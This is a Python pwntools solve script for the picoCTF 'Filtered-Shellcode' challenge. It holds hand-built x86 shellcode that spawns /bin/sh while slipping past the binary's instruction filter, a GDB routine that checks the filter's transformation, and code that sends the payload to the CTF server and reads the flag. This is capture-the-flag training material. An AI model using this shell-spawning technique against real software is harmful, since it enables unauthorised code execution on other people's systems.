#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the picoCTF challenge Filtered-Shellcode.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./fun")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

EXECVE_X86 = '0x0b' #11d, the syscall number for execve.
MAX_BYTES = 1000
GDB_COMMAND = '''
set logging on
set pagination off
file ./fun
set exception-verbose on
'''

def test_pattern():
    '''Since we're not actually reversing the `execute` function which is
    transforming the input, we're going to test to see if the output is what we
    expect (see README).
    '''

    input = cyclic(1000)
    # Insert two NOP instruction in between every two bytes.
    expected_output = ([input[i:i+2] + b"\x90\x90" for i in range(0, len(input), 2)])

    # Debug the program.
    with gdb.debug(exe.path, gdbscript=GDB_COMMAND, api=True) as fun:
        # Break at the location where we are about to call $eax inside of
        # execute`. $eax should therefor contain the instructions we are going
        # to execute.
        fun.gdb.Breakpoint('* 0x080485c9')

        # Send our input.
        fun.sendline(input)
        fun.gdb.continue_and_wait()

        # Get the frame after we've hit our breakpoint.
        frame = fun.gdb.selected_frame()
        eax = frame.read_register('eax')

        # Cast the Value representing $eax into a char * so we can dereference it.
        ptr = eax.cast(fun.gdb.lookup_type('unsigned char').pointer())
        output = ptr.format_string(address=False, raw=True, format='s', \
                max_elements=MAX_BYTES * 2) # *2 because we're inserting two NOPs in between every two bytes.

        # The docs explicitly say that we should not parse the output string, so
        # let's just do a check with our eyes.

        print(output) # You'll see \x220 which represents the \x90 instructions
        print(b''.join(expected_output).decode('utf-8', errors='backslashreplace'))

        # Here's where we would put an assert statement, but at the suggestion
        # of the documentation, we're not going to do that. My robot eyes can
        # tell they are pretty similar. We're going to assume the pattern holds.

def gen_shellcode():
    '''Create the shellcode we need to spawn a shell. Intel syntax.
    Return the assembly as a byte string.
    '''
    shellcode = f'''
    /* Move /sh to $eax. */
    xor eax, eax
    mov ah, 0x00
    mov al, 'h'
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    mov ah, 's'
    mov al, '/'

    /* Push $eax ('/sh') onto the stack. */
    push eax
    nop /* Needed to maintain alignment since push $eax is only one byte. */

    /* Move /bin to $eax. */
    mov ah, 'n'
    mov al, 'i'
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    shl eax, 1
    mov ah, 'b'
    mov al, '/'

    /* Push $eax ('/bin') onto the stack. */
    push eax
    nop /* Needed to maintain alignment since push $eax is only one byte. */

    /* x86 expects arg0 (the file to be executed) to be in $ebx. This should be
    ** a pointer to the string that should be executed. Our string '/bin/sh'
    ** resides on the stack so we can simply move $esp into $ebx. */
    mov ebx, esp

    /* Set up arg1 (the ** argv array). Since there are no arguments, we can
    ** pass a NULL byte. */
    xor ecx, ecx

    /* Set up arg2 (the ** envp). Since there are no environment variables, we
    ** can pass a NULL byte. */
    xor edx, edx

    /* Move the syscall number for execve into $eax. */
    xor eax, eax
    mov al, {EXECVE_X86}

    /* Call the syscall. */
    sysenter
    '''

    return asm(shellcode)

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('mercury.picoctf.net', 28494)

    else:
        io = process([exe.path])

    return io

def time_func(func):
    '''Time the main function.
    '''

    start = time.time()
    func()
    end = time.time()
    log.success(f'Time: {end - start}')

def main():
    '''Return the flag.
    '''

    #with gdb.debug(exe.path, gdbscript=GDB_COMMAND, api=True) as io:
    with conn() as io:
        # Break at the location where we are about to call $eax inside of
        # execute`. $eax should therefor contain the instructions we are going
        # to execute.
        # io.gdb.Breakpoint('* 0x080485c6')
        # io.gdb.Breakpoint('* 0x080485c9')

        # Send our input.
        io.sendlineafter(b'Give me code to run:', gen_shellcode())
        # io.gdb.continue_and_wait()

        # Get the flag.
        io.sendline(b'cat flag.txt')
        flag = io.recvuntilS(b'}').strip('\n')

        log.success(f'The flag is: {flag}')
        return flag


if __name__ == '__main__':
    time_func(main)
